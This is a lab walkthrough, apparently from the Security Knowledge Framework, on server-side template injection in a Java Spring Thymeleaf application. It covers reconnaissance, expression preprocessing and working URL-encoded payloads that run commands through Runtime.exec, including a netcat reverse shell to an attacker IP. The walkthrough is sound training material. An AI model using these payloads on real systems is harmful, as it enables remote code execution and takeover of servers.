# Server Side Template Injection - SSTI

## Running the app on Docker

```
$ sudo docker pull <MISSING JAVA SSTI DOCKER>
```

```
$ sudo docker run -ti -p 127.0.19.1:5000:5000 <MISSING JAVA SSTI DOCKER>
```

{% hint style="success" %}
Now that the app is running let's go hacking!
{% endhint %}

## Reconnaissance

#### Step 1

As with all reconnaissance we first have to determine the type of application that is running and the programming language it was written in. This could easily be achieved by setting up an intercepting proxy and study the requests and responses made by the application to the web server.

Also, trying to trigger error messages on the application can also give away a lot of information about the application under test.

On the landing page of the application, we have a page containing 2 links to different pages. Both redirects to an error page.

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/SSTI/1.png)

On the error pages, we continue searching for initial clues to find an attack vector. We realize that changing value in the URL is reflected on the response of the error page.

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/SSTI/2.png)

Let's play with URL a bit more to find out more information. In the screenshot below in the response of the error, we find that a Java backend is running, accompanied with the server "Tomcat". 

```
http://0.0.0.0:5000/error/test|
```

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/SSTI/3.png)

Now, what we have is a reflected user input on the error page with 'HTTP 500' and it is a Java application running on Tomcat.


#### Step2

Now that we have determined the type of application that is running let's try to see if any user supplied input is accepted by the application. The input from the URL is being processed directly in the application and outputted in the HTML. So now we have control of whatever is being reflected on the page. How do we now determine if the application might be susceptible to Server Side Template Injection?

First we need to do some investigation on how the syntax works, so we dive into the docs!

{% hint style="info" %}
[https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html](https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html)
{% endhint %}

Java Spring Thymeleaf expressions can have the following types:

```
${...}: Variable expressions – in practice, these are OGNL or Spring EL expressions.
*{...}: Selection expressions – similar to variable expressions but used for specific purposes.
#{...}: Message (i18n) expressions – used for internationalization.
@{...}: Link (URL) expressions – used to set correct URLs/paths in the application.
~{...}: Fragment expressions – they let you reuse parts of templates.
```

Now, we want to use expressions to print to the template output to see if our payloads are interpreted and executed on the server-side by the templating engine. The most ideal way to do so is to inject mathematical statements.

As found in the docs:

```
@{( 4 + 4 )} is 8.
```

Let's see what happens when we inject the expression with the operator described above!

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/SSTI/4.png)

## Exploitation

A nice write-ups about different type of payloads on Spring Thymeleaf engine is found here:

[https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

Thymeleaf template engine has a feature called expression preprocessing. Expressions placed between double underscores (&#95;&#95;...&#95;&#95;) are preprocessed and the result of the preprocessing is used as part of the expression during regular processing. Here is an example from Thymeleaf documentation:

```
#{populated.__${populate.code}__}
```

Thymeleaf first preprocesses ${populate.code}. Then, it uses the result (in this example it is a stored value ALL) as part of a real expression evaluated later (#{populated.ALL}).

Now, lets try some useful injections.

Running 'id' command on target server:

```
::__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::

```

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/SSTI/5.png)

Even tough the result is not seen in the frontend, we can see that 'id' command has been executed on the server logs.

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/SSTI/6.png)

Running 'touch pwn' command on target server to create a file named 'pwn' on current running directory.
```
::__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22touch%20pwn%22).getInputStream()).next()%7d__::
```

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/SSTI/7.png)

Running netcat command on target server to get a revershell to our attacking machine by using the payload below.
```
::__$%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22nc%20-c%20bash%20192.168.13.131%201337%22).getInputStream()).next()%7D__::
```

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/SSTI/8.png)

Yes! We got the reverse shell and the control over the target machine.

## Additional sources

[https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

[https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#what-is-thymeleaf](https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#what-is-thymeleaf)
